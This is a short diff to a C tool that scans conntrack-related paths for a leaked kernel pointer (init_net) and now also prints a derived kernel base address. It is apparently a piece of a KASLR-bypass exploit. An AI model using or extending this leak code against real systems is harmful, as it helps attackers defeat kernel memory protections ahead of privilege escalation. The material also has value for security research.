@@ -25,7 +25,7 @@ unsigned long get_kernel_addr_conntrack() {
   const int addr_len = sizeof(long*) * 2;
   char d_path[256];
 
-  printf("[.] trying %s ...\n", path);
+  printf("[.] trying %snf_contrack_* ...\n", path);
 
   DIR *d = opendir(path);
 
@@ -54,7 +54,7 @@ unsigned long get_kernel_addr_conntrack() {
 
     addr = strtoul(&substr[start], (char **)&substr[end], 16);
 
-    if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
+    if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
       break;
 
     addr = 0;
@@ -71,6 +71,7 @@ int main(int argc, char **argv) {
     return 1;
 
   printf("leaked init_net: %lx\n", addr);
+  printf("possible kernel base: %lx\n", addr &~ KERNEL_BASE_MASK);
 
   return 0;
 }
